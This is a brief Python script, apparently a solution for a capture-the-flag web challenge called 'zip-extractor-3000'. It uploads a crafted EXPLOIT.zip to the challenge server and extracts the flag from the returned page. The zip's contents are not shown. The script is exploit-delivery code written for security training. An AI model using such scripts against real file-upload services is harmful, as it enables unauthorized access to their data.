#!/bin/python3

import os
import requests
from pwn import *
import logging

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://zip-extractor-3000.challs.teamitaly.eu:8000")
if URL.endswith("/"):
   URL = URL[:-1]

files = {'file': open(os.path.join(os.path.dirname(__file__), "EXPLOIT.zip"), 'rb')}

r = requests.post(URL + '/', files=files)
# print(r.text)

# Check challenge
flag = r.text.split('<b id="result">')[1].split('</b>')[0]
print(flag)
